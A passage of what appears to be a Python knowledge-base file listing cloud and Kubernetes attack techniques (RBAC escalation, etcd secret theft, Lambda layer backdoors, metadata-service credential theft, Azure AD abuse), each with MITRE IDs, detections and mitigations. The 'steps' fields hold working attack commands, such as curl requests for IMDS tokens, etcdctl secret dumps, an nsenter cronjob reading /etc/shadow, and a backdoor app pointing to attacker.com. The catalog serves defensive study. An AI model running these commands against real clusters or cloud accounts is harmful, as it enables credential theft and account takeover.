        "steps": "1. Enumerate RBAC: `kubectl auth can-i --list`\n2. Check for nodes/proxy permission: `kubectl auth can-i create nodes/proxy`\n3. If allowed, proxy to node: `kubectl proxy --port=8001`\n4. Access node kubelet: `curl http://localhost:8001/api/v1/nodes/<node-name>:10250/proxy/pods`\n5. Access node logs: `curl http://localhost:8001/api/v1/nodes/<node-name>:10250/proxy/logs/`\n6. Execute commands on node via kubelet: `curl -sk https://<node-ip>:10250/exec/<namespace>/<pod>/<container>?command=/bin/bash&stdin=true&tty=true`",
        "detection": [
            "Node proxy API calls from unexpected sources",
            "Kubelet API access via proxy",
            "RBAC with nodes/proxy permission for non-admin",
            "Direct kubelet endpoint access patterns",
        ],
        "mitigations": [
            "Restrict nodes/proxy RBAC permission",
            "Network policies limiting kubelet access",
            "Kubelet authentication and authorization",
            "Admission controllers restricting node proxy usage",
        ],
    },
    # === KUBERNETES ===
    {
        "category": "kubernetes",
        "name": "Kubernetes RBAC Privilege Escalation",
        "mitre_ids": ["T1548.001"],
        "desc": "Escalating privileges through misconfigured Kubernetes RBAC policies.",
        "steps": "1. Enumerate RBAC permissions: `kubectl auth can-i --list`\n2. Check for dangerous permissions: `kubectl auth can-i create pods --as=system:serviceaccount:default:sa`\n3. Create privileged pod: `kubectl apply -f privileged-pod.yaml`\n4. Exec into privileged pod: `kubectl exec -it privileged-pod -- /bin/bash`\n5. From privileged pod, escape to node: `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`\n6. Alternatively: create clusterrolebinding: `kubectl create clusterrolebinding privesc --clusterrole=cluster-admin --user=<compromised-user>`",
        "detection": [
            "RBAC escalation attempts in audit logs",
            "ClusterRole/ClusterRoleBinding creation by non-admin",
            "Privileged pod creation events",
            "Service account with excessive permissions",
        ],
        "mitigations": [
            "Principle of least privilege for RBAC",
            "Regular RBAC audit",
            "Restrict cluster-admin bindings",
            "Admission controllers for pod security",
            "Namespace isolation",
        ],
    },
    {
        "category": "kubernetes",
        "name": "Kubernetes Secret Extraction",
        "mitre_ids": ["T1552.007"],
        "desc": "Extracting Kubernetes secrets from etcd or via API.",
        "steps": "1. List secrets: `kubectl get secrets --all-namespaces`\n2. Extract specific secret: `kubectl get secret <name> -o yaml`\n3. Decode base64 values: `echo '<base64>' | base64 -d`\n4. Access etcd directly: `ETCDCTL_API=3 etcdctl get / --prefix --keys-only | grep secret`\n5. Extract from etcd: `ETCDCTL_API=3 etcdctl get /registry/secrets/default/<name>`",
        "detection": [
            "Secret access from unauthorized pods",
            "Bulk secret listing via API",
            "Direct etcd access attempts",
            "Secret decryption outside expected workflows",
        ],
        "mitigations": [
            "Encrypt etcd at rest",
            "Restrict secret access via RBAC",
            "Use external secret managers (Vault)",
            "Audit logging for secret access",
        ],
    },
    {
        "category": "kubernetes",
        "name": "Kubernetes etcd Data Exfiltration",
        "mitre_ids": ["T1552.007"],
        "desc": "Extracting sensitive data from etcd, the Kubernetes key-value store.",
        "steps": "1. Identify etcd nodes: `kubectl get nodes -o wide`\n2. Check etcd accessibility: `ETCDCTL_API=3 etcdctl --endpoints=https://<node>:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get / --prefix --keys-only`\n3. Extract secrets: `ETCDCTL_API=3 etcdctl get /registry/secrets --prefix --keys-only`\n4. Get specific secret: `ETCDCTL_API=3 etcdctl get /registry/secrets/default/<name>`\n5. Decrypt if etcd encryption is enabled (need encryption config)",
        "detection": [
            "Direct etcd access from non-etcd nodes",
            "etcd certificate usage from unexpected sources",
            "Large data reads from etcd",
            "etcd connection from pod network",
        ],
        "mitigations": [
            "Encrypt etcd at rest",
            "Network policies restricting etcd access",
            "TLS mutual authentication for etcd",
            "Audit logging for etcd access",
        ],
    },
    {
        "category": "kubernetes",
        "name": "Kubernetes etcd Certificate Theft",
        "mitre_ids": ["T1552.004"],
        "desc": "Stealing Kubernetes etcd TLS certificates to directly access and manipulate cluster state.",
        "steps": '1. Locate etcd certificates: `ls /etc/kubernetes/pki/etcd/`\n2. Or from compromised node: `find / -name "*.crt" -path "*etcd*" 2>/dev/null`\n3. Copy certificates: `cp /etc/kubernetes/pki/etcd/{ca.crt,server.crt,server.key} /tmp/`\n4. Connect to etcd using stolen certs: `ETCDCTL_API=3 etcdctl --endpoints=https://<etcd-ip>:2379 --cacert=/tmp/ca.crt --cert=/tmp/server.crt --key=/tmp/server.key get / --prefix --keys-only`\n5. Extract all secrets: `ETCDCTL_API=3 etcdctl get /registry/secrets --prefix`\n6. Modify cluster state: `ETCDCTL_API=3 etcdctl put /registry/secrets/default/new-secret <payload>`',
        "detection": [
            "Etcd certificate file access from unexpected processes",
            "Etcd connections from non-etcd nodes",
            "Certificate file reads in kubelet logs",
            "Unauthorized etcd API calls",
        ],
        "mitigations": [
            "Restrict file permissions on etcd certificates",
            "Network policies blocking etcd access from pod network",
            "Monitor etcd certificate file access",
            "Use dedicated etcd nodes with restricted SSH access",
        ],
    },
    {
        "category": "kubernetes",
        "name": "Kubernetes API Server Exploitation",
        "mitre_ids": ["T1190"],
        "desc": "Exploiting misconfigured or vulnerable Kubernetes API server for cluster compromise.",
        "steps": "1. Discover API server: `nmap -p 6443 <target>` or check kubeconfig\n2. Test anonymous access: `curl -sk https://<api-server>:6443/api/v1/nodes`\n3. Check for RBAC misconfigurations: `kubectl auth can-i --list --as=system:anonymous`\n4. Exploit permissive RBAC: `kubectl auth can-i create pods --as=system:anonymous`\n5. Create privileged pod: `kubectl apply -f privileged-pod.yaml` (if anonymous pod creation allowed)\n6. Access secrets: `kubectl get secrets --all-namespaces` (if anonymous secret access allowed)",
        "detection": [
            "Anonymous API server access in audit logs",
            "API requests from unexpected source IPs",
            "Unauthenticated API calls succeeding",
            "Privileged pod creation by anonymous user",
        ],
        "mitigations": [
            "Disable anonymous authentication on API server",
            "Strict RBAC policies",
            "Network policies restricting API server access",
            "API server audit logging",
        ],
    },
    {
        "category": "kubernetes",
        "name": "Kubernetes Kubeconfig File Theft",
        "mitre_ids": ["T1552.001"],
        "desc": "Stealing Kubernetes kubeconfig files to gain cluster access with potentially elevated privileges.",
        "steps": '1. Search for kubeconfig: `find / -name "kubeconfig" -o -name "config" -path "*kube*" 2>/dev/null`\n2. Check default locations: `cat ~/.kube/config`\n3. Check environment: `echo $KUBECONFIG`\n4. Search for service account tokens: `find / -name "token" -path "*serviceaccount*" 2>/dev/null`\n5. Use stolen kubeconfig: `kubectl --kubeconfig=/tmp/stolen-config get nodes`\n6. Escalate with stolen admin credentials: `kubectl --kubeconfig=/tmp/stolen-config create clusterrolebinding attack --clusterrole=cluster-admin --user=stolen`',
        "detection": [
            "Kubeconfig file access from unexpected processes",
            "API calls with stolen credentials from unusual IPs",
            "kubeconfig file reads in audit logs",
            "Service account token usage from non-kubelet processes",
        ],
        "mitigations": [
            "Secure kubeconfig file permissions (0600)",
            "Use short-lived certificates and tokens",
            "Monitor kubeconfig file access",
            "Implement certificate rotation",
        ],
    },
    {
        "category": "kubernetes",
        "name": "Kubernetes Cronjob Privilege Escalation",
        "mitre_ids": ["T1548.001"],
        "desc": "Using Kubernetes cronjob permissions to create scheduled privileged workloads.",
        "steps": '1. Check cronjob permissions: `kubectl auth can-i create cronjobs`\n2. Create malicious cronjob: `kubectl create cronjob privesc --image=alpine --schedule="*/1 * * * *" -- /bin/sh -c "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c \\"cat /etc/shadow\\""`\n3. Or create cronjob with privileged pod: write YAML with privileged securityContext\n4. Apply: `kubectl apply -f malicious-cronjob.yaml`\n5. Wait for cronjob to execute: `kubectl get pods --watch`\n6. Collect output: `kubectl logs <pod-name>`',
        "detection": [
            "Cronjob creation by non-admin users",
            "Privileged security context in cronjob spec",
            "Cronjobs with host namespace sharing",
            "Cronjob pods executing nsenter or host commands",
        ],
        "mitigations": [
            "Restrict cronjob creation via RBAC",
            "Admission controllers blocking privileged cronjobs",
            "Pod security standards enforcement",
            "Audit logging for cronjob creation",
        ],
    },
    {
        "category": "kubernetes",
        "name": "Kubernetes Namespace Escape",
        "mitre_ids": ["T1548.001"],
        "desc": "Escaping from one Kubernetes namespace to access resources in another or cluster-wide resources.",
        "steps": "1. Enumerate accessible namespaces: `kubectl get namespaces`\n2. Check cross-namespace permissions: `kubectl auth can-i list pods --namespace=kube-system`\n3. Check for network policies: `kubectl get networkpolicies -n <namespace>`\n4. If no network policies, scan services: `nmap -sT <service-ip-range>`\n5. Access services in other namespaces: `curl http://<service>.<namespace>.svc.cluster.local:8080`\n6. Exploit shared volumes or misconfigured RBAC to pivot: `kubectl --as=system:serviceaccount:default:sa get secrets -n kube-system`",
        "detection": [
            "Cross-namespace API calls",
            "Service discovery scanning across namespaces",
            "RBAC escalation allowing namespace traversal",
            "Network connections crossing namespace boundaries",
        ],
        "mitigations": [
            "Network policies enforcing namespace isolation",
            "Strict RBAC with namespace-scoped roles",
            "Admission controllers restricting cross-namespace access",
            "Service mesh (Istio) authorization policies",
        ],
    },
    # === SERVERLESS ===
    {
        "category": "serverless",
        "name": "AWS Lambda Injection and Privilege Escalation",
        "mitre_ids": ["T1548.001"],
        "desc": "Exploiting Lambda functions for privilege escalation and data access.",
        "steps": '1. Enumerate Lambda functions: `aws lambda list-functions`\n2. Check function permissions: `aws lambda get-policy --function-name <name>`\n3. Identify IAM role: `aws lambda get-function --function-name <name> --query "Configuration.Role"`\n4. Invoke function with crafted payload: `aws lambda invoke --function-name <name> --payload "<malicious_json>" output.json`\n5. Extract environment variables (may contain secrets): `aws lambda get-function-configuration --function-name <name> --query "Environment.Variables"`\n6. Use function\'s IAM role for further access',
        "detection": [
            "Lambda invocation from unusual sources",
            "Environment variable extraction",
            "Lambda function policy modifications",
            "Function invocation with anomalous payload size",
        ],
        "mitigations": [
            "Least privilege IAM roles for Lambda",
            "Environment variable encryption with KMS",
            "Lambda function policies restricting invocation",
            "CloudTrail monitoring for Lambda events",
        ],
    },
    {
        "category": "serverless",
        "name": "Serverless SSRF via Lambda Event Injection",
        "mitre_ids": ["T1071.001"],
        "desc": "Injecting malicious data into Lambda event sources to trigger SSRF.",
        "steps": "1. Identify Lambda with S3 trigger: check for S3 event source mapping\n2. Upload malicious S3 object with crafted filename: `aws s3 cp '<script>alert(1)</script>.txt' s3://<bucket>/`\n3. Lambda processes event — SSRF in URL parsing: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n4. Or inject via API Gateway: craft HTTP request that triggers Lambda with SSRF payload\n5. Exfiltrate data via Lambda's network access to internal services",
        "detection": [
            "Lambda invocations with SSRF indicators",
            "Outbound connections to 169.254.169.254 from Lambda",
            "S3 event source with unusual object keys",
            "API Gateway requests triggering internal network access",
        ],
        "mitigations": [
            "Input validation in Lambda handlers",
            "VPC configuration for Lambda restricting outbound",
            "IMDSv2 enforcement",
            "API Gateway request validation",
        ],
    },
    {
        "category": "serverless",
        "name": "AWS Lambda Environment Variable Exfiltration",
        "mitre_ids": ["T1552.003"],
        "desc": "Extracting sensitive data from Lambda environment variables that often contain credentials and API keys.",
        "steps": "1. Enumerate Lambda functions: `aws lambda list-functions --query 'Functions[].FunctionName'`\n2. Get function configuration: `aws lambda get-function-configuration --function-name <name>`\n3. Extract environment variables: `aws lambda get-function-configuration --function-name <name> --query 'Environment.Variables'`\n4. Look for secrets: common keys like DB_PASSWORD, API_KEY, SECRET_TOKEN\n5. Use extracted credentials: `aws ssm get-parameter --name <param> --profile compromised`\n6. Or access database directly with extracted connection strings",
        "detection": [
            "Lambda GetFunctionConfiguration API calls from unusual identities",
            "Bulk environment variable extraction across functions",
            "Environment variables containing secrets accessed via CloudTrail",
            "Function configuration reads from non-deployment sources",
        ],
        "mitigations": [
            "Use AWS Secrets Manager instead of environment variables",
            "Encrypt environment variables with KMS customer-managed keys",
            "Restrict lambda:GetFunctionConfiguration IAM permission",
            "CloudTrail alerts for bulk function configuration reads",
        ],
    },
    {
        "category": "serverless",
        "name": "Azure Function Key Extraction",
        "mitre_ids": ["T1552.001"],
        "desc": "Extracting Azure Function access keys to invoke restricted functions and escalate access.",
        "steps": "1. Enumerate Azure Functions: `az functionapp list --query '[].{Name:name, ResourceGroup:resourceGroup}'`\n2. Get function keys: `az functionapp keys list --resource-group <rg> --name <function-app>`\n3. Or via Kudu API: `curl -u <user>:<password> https://<function-app>.scm.azurewebsites.net/api/functions/admin/masterkey`\n4. Invoke function with master key: `curl -x POST https://<function-app>.azurewebsites.net/api/<function>?code=<master-key>`\n5. Extract app settings (may contain connection strings): `az functionapp config appsettings list --resource-group <rg> --name <function-app>`",
        "detection": [
            "Function key retrieval from unusual sources",
            "Master key usage from unexpected IPs",
            "Kudu API access from non-deployment sources",
            "Function invocation with admin-level keys",
        ],
        "mitigations": [
            "Rotate function keys regularly",
            "Use managed identities instead of function keys",
            "Restrict Kudu API access via IP restrictions",
            "Monitor function key retrieval in Azure Activity Log",
        ],
    },
    {
        "category": "serverless",
        "name": "GCP Cloud Function Exploitation",
        "mitre_ids": ["T1548.001"],
        "desc": "Exploiting GCP Cloud Functions for privilege escalation and data exfiltration.",
        "steps": "1. List Cloud Functions: `gcloud functions list`\n2. Get function details: `gcloud functions describe <function-name> --format=json`\n3. Check IAM policy: `gcloud functions get-iam-policy <function-name>`\n4. Invoke function: `gcloud functions call <function-name> --data='{}'`\n5. If function source is accessible: `gcloud functions source download <function-name>`\n6. Exploit function's service account for escalation: use function credentials to access other GCP resources",
        "detection": [
            "Cloud Function invocations from unusual identities",
            "Function source code download events",
            "IAM policy changes on Cloud Functions",
            "Function service account usage from unexpected sources",
        ],
        "mitigations": [
            "Least privilege service accounts for Cloud Functions",
            "Restrict function invocation IAM permissions",
            "Enable VPC Service Controls",
            "Cloud Audit Logging for function access",
        ],
    },
    {
        "category": "serverless",
        "name": "Serverless SSRF to Internal Metadata",
        "mitre_ids": ["T1071.001"],
        "desc": "Using serverless functions as SSRF pivot points to access cloud metadata services and internal APIs.",
        "steps": "1. Identify serverless function processing URLs or HTTP requests\n2. Craft SSRF payload targeting metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS)\n3. For Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`\n4. For GCP: `http://metadata.google.internal/computeMetadata/v1/`\n5. Exfiltrate credentials via function response or outbound channel\n6. Use stolen credentials to access cloud resources: `aws sts get-caller-identity --profile stolen`",
        "detection": [
            "Serverless function outbound connections to 169.254.169.254",
            "SSRF payloads in function input events",
            "Metadata service access from Lambda/Function VPC",
            "Internal API access patterns from serverless functions",
        ],
        "mitigations": [
            "IMDSv2 enforcement on all EC2 instances",
            "VPC configuration restricting outbound from functions",
            "Input validation and URL allowlisting in function code",
            "Network policies blocking metadata access",
        ],
    },
    {
        "category": "serverless",
        "name": "Serverless Persistence via Layer Injection",
        "mitre_ids": ["T1548.001"],
        "desc": "Injecting malicious Lambda layers to maintain persistence in serverless environments.",
        "steps": "1. Enumerate Lambda layers: `aws lambda list-layers`\n2. Check function layer usage: `aws lambda get-function-configuration --function-name <name> --query 'Layers'`\n3. Create malicious layer: `zip layer.zip malicious_handler.py` with code that exfiltrates env vars\n4. Publish layer version: `aws lambda publish-layer-version --layer-name backdoor --zip-file fileb://layer.zip --compatible-runtimes python3.9`\n5. Attach to target function: `aws lambda update-function-configuration --function-name <name> --layers arn:aws:lambda:region:account:layer:backdoor:1`\n6. Layer code executes on every invocation, exfiltrating credentials",
        "detection": [
            "New Lambda layer versions published by non-authorized users",
            "Layer attachment to existing functions",
            "Function configuration changes adding layers",
            "Layer ARN from external or unknown accounts",
        ],
        "mitigations": [
            "Restrict lambda:PublishLayerVersion and lambda:UpdateFunctionConfiguration",
            "Lambda function policies restricting layer sources",
            "CloudTrail monitoring for layer modifications",
            "Code signing for Lambda layers",
        ],
    },
    # === IMDS ===
    {
        "category": "imds",
        "name": "AWS IMDSv1 Credential Theft (Instance Metadata)",
        "mitre_ids": ["T1552.005"],
        "desc": "Stealing AWS credentials from instance metadata service via SSRF.",
        "steps": "1. Find SSRF vulnerability in application\n2. Query IMDSv1: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`\n3. Extract credentials: AccessKeyId, SecretAccessKey, Token\n4. Configure AWS CLI: `aws configure set aws_access_key_id <key> --profile stolen`\n5. Enumerate permissions: `aws sts get-caller-identity --profile stolen`\n6. Escalate: `aws iam list-users --profile stolen`",
        "detection": [
            "IMDS queries from unexpected sources",
            "SSRF attempts to 169.254.169.254",
            "Temporary credential usage from unusual IPs",
            "IMDSv1 vs IMDSv2 request patterns",
        ],
        "mitigations": [
            "IMDSv2 enforcement (mandatory hop limit)",
            "Network ACLs restricting IMDS access",
            "IMDSv2 with PUT request requirement",
            "WAF rules blocking IMDS access",
        ],
    },
    {
        "category": "imds",
        "name": "GCP Metadata Service Credential Theft",
        "mitre_ids": ["T1552.005"],
        "desc": "Stealing GCP service account tokens via metadata service.",
        "steps": "1. Find SSRF vulnerability in application\n2. Query GCP metadata: `curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/`\n3. Get service account token: `curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`\n4. Get project info: `curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id`\n5. Use token: `gcloud auth activate-service-account --access-token-file=<token_file>`",
        "detection": [
            "Metadata API calls from unexpected sources",
            "Service account token usage from unusual IPs",
            "SSRF to metadata.google.internal",
            "Token refresh anomalies",
        ],
        "mitigations": [
            "Metadata concealment (enable-oslogin)",
            "VPC Service Controls",
            "Identity-Aware Proxy",
            "Restrict VM service account scopes",
        ],
    },
    {
        "category": "imds",
        "name": "Azure IMDS Credential Theft",
        "mitre_ids": ["T1552.005"],
        "desc": "Stealing Azure managed identity tokens via instance metadata service.",
        "steps": '1. Find SSRF vulnerability in application\n2. Query Azure IMDS: `curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"`\n3. Get managed identity token: `curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`\n4. Use token for Azure management: `curl -H "Authorization: Bearer <token>" "https://management.azure.com/subscriptions?api-version=2020-01-01"`\n5. Enumerate resources and escalate',
        "detection": [
            "IMDS queries from non-Azure IPs",
            "Managed identity token requests from unusual sources",
            "SSRF attempts to 169.254.169.254/metadata",
            "Resource enumeration using stolen tokens",
        ],
        "mitigations": [
            "Azure IMDS rate limiting",
            "Managed identity with minimal permissions",
            "Network security groups restricting IMDS",
            "Azure Defender for Cloud detection",
        ],
    },
    {
        "category": "imds",
        "name": "AWS IMDSv2 Bypass via SSRF with PUT",
        "mitre_ids": ["T1552.005"],
        "desc": "Bypassing IMDSv2 token requirement through SSRF that supports PUT requests to obtain a session token.",
        "steps": '1. Identify SSRF vulnerability that allows PUT requests\n2. Obtain IMDSv2 token via SSRF: `curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token`\n3. Use token to query metadata: `curl -H "X-aws-ec2-metadata-token: <token>" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`\n4. Extract credentials: AccessKeyId, SecretAccessKey, Token\n5. Configure AWS CLI with stolen credentials\n6. Enumerate and escalate: `aws sts get-caller-identity --profile stolen`',
        "detection": [
            "PUT requests to IMDS token endpoint from SSRF vectors",
            "IMDSv2 token requests from application vulnerabilities",
            "Metadata service access with fresh tokens from unusual sources",
            "SSRF patterns including PUT method to AWS metadata",
        ],
        "mitigations": [
            "Enforce IMDSv2 with hop limit of 1",
            "Network firewalls blocking outbound IMDS from application layer",
            "Application-level SSRF protection and input validation",
            "CloudGuard or WAF rules detecting IMDS token requests",
        ],
    },
    {
        "category": "imds",
        "name": "Azure Managed Identity Token Scope Escalation",
        "mitre_ids": ["T1552.005"],
        "desc": "Exploiting Azure managed identity token scope to obtain tokens for unintended resources and escalate access.",
        "steps": '1. Obtain managed identity token with basic scope: `curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`\n2. Request token for different resource to escalate scope: `curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"`\n3. Use Graph API token: `curl -H "Authorization: Bearer <graph-token>" "https://graph.microsoft.com/v1.0/users"`\n4. Request token for Key Vault: `curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"`\n5. Access Key Vault secrets: `curl -H "Authorization: Bearer <kv-token>" "https://<vault>.vault.azure.net/secrets?api-version=7.1"`',
        "detection": [
            "Managed identity token requests for multiple resources",
            "Token scope escalation patterns in Azure AD logs",
            "Graph API access from compute resources",
            "Key Vault access using managed identity tokens from unusual sources",
        ],
        "mitigations": [
            "Restrict managed identity permissions to minimum required",
            "Azure AD Conditional Access policies for token issuance",
            "Monitor token scope requests per resource type",
            "Key Vault access policies limiting managed identity scope",
        ],
    },
    {
        "category": "imds",
        "name": "GCP Service Account Key Extraction via IMDS",
        "mitre_ids": ["T1552.005"],
        "desc": "Extracting GCP service account keys and tokens from instance metadata for persistent access.",
        "steps": '1. Access GCP metadata via SSRF: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/`\n2. Get service account email: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email`\n3. Get access token: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`\n4. Get identity token: `curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com"`\n5. Enumerate project: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id`\n6. List compute instances: `gcloud compute instances list --access-token-file=<token>`',
        "detection": [
            "GCP metadata API calls from unexpected sources",
            "Service account token requests from SSRF vectors",
            "Identity token generation for external audiences",
            "Project enumeration from metadata service",
        ],
        "mitigations": [
            "Enable metadata concealment on all VMs",
            "Restrict service account scopes",
            "VPC Service Controls for resource isolation",
            "Organization Policy constraints on metadata access",
        ],
    },
    {
        "category": "imds",
        "name": "Alibaba Cloud Metadata Extraction",
        "mitre_ids": ["T1552.005"],
        "desc": "Extracting Alibaba Cloud instance metadata and security credentials for unauthorized access.",
        "steps": "1. Identify SSRF vulnerability in application\n2. Query Alibaba metadata: `curl http://100.100.100.200/latest/meta-data/`\n3. Get RAM role credentials: `curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>`\n4. Extract AccessKeyId, AccessKeySecret, SecurityToken\n5. Configure Alibaba CLI: `aliyun configure --access-key-id <key> --access-key-secret <secret>`\n6. Enumerate resources: `aliyun ecs DescribeInstances --security-token <token>`",
        "detection": [
            "Requests to 100.100.100.200 from unexpected sources",
            "Alibaba metadata API access from SSRF vectors",
            "RAM role credential extraction patterns",
            "Instance metadata queries from non-ECS networks",
        ],
        "mitigations": [
            "Enable IMDSv2 on Alibaba Cloud instances",
            "Network security groups restricting metadata access",
            "Web Application Firewall blocking SSRF to 100.100.100.200",
            "RAM role with minimal permissions",
        ],
    },
    {
        "category": "imds",
        "name": "DigitalOcean Metadata API Exploitation",
        "mitre_ids": ["T1552.005"],
        "desc": "Extracting DigitalOcean Droplet metadata including user-data and API tokens.",
        "steps": "1. Find SSRF vulnerability in application on DigitalOcean Droplet\n2. Query DO metadata: `curl http://169.254.169.254/metadata/v1.json`\n3. Get user-data (may contain init scripts with secrets): `curl http://169.254.169.254/metadata/v1/user-data`\n4. Get Droplet info: `curl http://169.254.169.254/metadata/v1/`\n5. Extract DNS info: `curl http://169.254.169.254/metadata/v1/dns/nameservers`\n6. Use discovered credentials or API tokens for further access",
        "detection": [
            "DigitalOcean metadata API access from unexpected sources",
            "User-data retrieval from SSRF vectors",
            "API token usage from unusual IPs",
            "Droplet metadata enumeration patterns",
        ],
        "mitigations": [
            "Firewall rules restricting metadata access",
            "Avoid storing secrets in user-data scripts",
            "Use DigitalOcean Secrets Manager instead of user-data",
            "Application-level SSRF protection",
        ],
    },
    # === AZURE AD ===
    {
        "category": "azure_ad",
        "name": "Azure AD Privilege Escalation",
        "mitre_ids": ["T1548.001"],
        "desc": "Escalating privileges in Azure AD through role manipulation and directory configuration abuse.",
        "steps": '1. Enumerate Azure AD roles: `az rest --method GET --uri https://graph.microsoft.com/v1.0/directoryRoles`\n2. Check current user roles: `az rest --method GET --uri https://graph.microsoft.com/v1.0/me/memberOf`\n3. Identify privilege escalation paths: look for Application Administrator, Privileged Role Administrator\n4. Add self to Global Admin role (if Application Admin): `az rest --method POST --uri https://graph.microsoft.com/v1.0/directoryRoles/<role-id>/members --body "{\\"@odata.id\\":\\"https://graph.microsoft.com/v1.0/directoryObjects/<user-id>\\"}"`\n5. Or create service principal with admin consent: `az ad sp create --id <app-id>`\n6. Grant app permissions: `az rest --method POST --uri https://graph.microsoft.com/v1.0/oauth2PermissionGrants`',
        "detection": [
            "Azure AD role assignment changes",
            "Privileged role additions for non-admin users",
            "Application registration by unauthorized users",
            "Directory role membership changes in audit logs",
        ],
        "mitigations": [
            "Azure AD Privileged Identity Management (PIM)",
            "Require approval for privileged role assignments",
            "Conditional Access policies for admin operations",
            "Regular Azure AD access reviews",
        ],
    },
    {
        "category": "azure_ad",
        "name": "Azure AD Conditional Access Bypass",
        "mitre_ids": ["T1548.001"],
        "desc": "Bypassing Azure AD Conditional Access policies through authentication flow manipulation.",
        "steps": '1. Enumerate Conditional Access policies: `az rest --method GET --uri https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies`\n2. Identify policy gaps: missing conditions, excluded apps, or legacy authentication bypass\n3. Bypass via legacy protocols: `curl -X POST https://login.microsoftonline.com/<tenant>/oauth2/token -d "grant_type=password&client_id=<app>&username=<user>&password=<pass>&resource=https://outlook.office365.com"`\n4. Bypass via device code flow: `az rest --method POST --uri https://login.microsoftonline.com/<tenant>/oauth2/devicecode`\n5. Exploit excluded applications: use an app not covered by Conditional Access\n6. Use token from bypassed flow for privileged access',
        "detection": [
            "Authentication from excluded applications in audit logs",
            "Legacy authentication attempts after Conditional Access rollout",
            "Device code flow authentication from suspicious sources",
            "Token acquisition bypassing MFA requirements",
        ],
        "mitigations": [
            "Block legacy authentication protocols",
            "Apply Conditional Access to all cloud apps (no exclusions)",
            "Require MFA for all users and all applications",
            "Monitor and alert on legacy authentication attempts",
        ],
    },
    {
        "category": "azure_ad",
        "name": "Azure AD App Registration Abuse",
        "mitre_ids": ["T1136.001"],
        "desc": "Abusing Azure AD application registration to create persistent backdoor access.",
        "steps": "1. Check app registration permissions: `az rest --method GET --uri https://graph.microsoft.com/v1.0/me/memberOf`\n2. Register new application: `az ad app create --display-name backdoor-app --reply-urls https://attacker.com/auth`\n3. Add secret to app: `az ad app credential reset --id <app-id> --append`\n4. Grant API permissions: `az ad app permission add --id <app-id> --api 00000003-0000-0000-c000-000000000000 --api-permissions Directory.ReadWrite.All=Application`\n5. Admin consent (if available): `az ad app permission admin-consent --id <app-id>`\n6. Use app credentials for persistent access: `az login --service-principal -u <app-id> -p <secret> --tenant <tenant>`",
        "detection": [
            "Application registration by non-standard users",
            "App permissions with Directory.ReadWrite.All",
            "Admin consent granted to new applications",
            "Service principal login from unusual locations",
        ],
        "mitigations": [
            "Restrict who can register applications in Azure AD",
            "Require admin consent for all app permissions",
            "Monitor application registrations via audit logs",
            "Regular review of application permissions",
        ],
    },
    {
        "category": "azure_ad",
        "name": "Azure AD Device Registration Abuse",
        "mitre_ids": ["T1548.001"],
        "desc": "Abusing Azure AD device registration to establish persistent access and bypass conditional access policies.",
        "steps": '1. Register a device: `az rest --method POST --uri https://graph.microsoft.com/v1.0/devices --body "{\\"displayName\\":\\"compromised-device\\",\\"operatingSystem\\":\\"Windows\\",\\"operatingSystemVersion\\":\\"10.0\\"}"`\n2. Or join device to Azure AD via settings\n3. Use device as compliant for Conditional Access: register as compliant device\n4. Obtain device token: `curl -X POST https://login.microsoftonline.com/<tenant>/oauth2/token -d "grant_type=device_code&client_id=<app>&device_id=<device-id>"`\n5. Access resources with device-based Conditional Access bypass\n6. Maintain persistence: device remains registered even after password reset',
        "detection": [
            "Device registration from unusual locations or IPs",
            "Rapid device registration and resource access",
            "Device compliance status anomalies",
            "Multiple device registrations from single user",
        ],
        "mitigations": [
            "Require admin approval for device registration",
            "Conditional Access requiring compliant AND domain-joined devices",
            "Monitor device registration audit logs",
            "Device compliance policy enforcement",
        ],
    },
    # === GCP SECURITY ===
    {
        "category": "gcp_security",
        "name": "GCP IAM Policy Exploitation",
        "mitre_ids": ["T1548.001"],
        "desc": "Exploiting overly permissive GCP IAM policies for privilege escalation.",
        "steps": "1. Enumerate IAM policies: `gcloud projects get-iam-policy <project>`\n2. Check own permissions: `gcloud iam check-policy --project <project> --principal user:<email>`\n3. Identify overly permissive bindings: roles/owner, roles/editor, roles/resourcemanager.projectIamAdmin\n4. Add self to project owner: `gcloud projects add-iam-policy-binding <project> --member user:<attacker> --role roles/owner`\n5. Or exploit service account impersonation: `gcloud iam service-accounts add-iam-policy-binding <sa> --member user:<attacker> --role roles/iam.serviceAccountTokenCreator`\n6. Impersonate SA: `gcloud auth activate-service-account --key-file=<sa-key.json>`",
        "detection": [
            "IAM policy changes adding owner/editor roles",
            "Service account impersonation from unusual users",
            "IAM binding additions for project-level roles",
            "Privilege escalation patterns in Cloud Audit Logs",
        ],
        "mitigations": [
            "Organization Policy constraints on role grants",
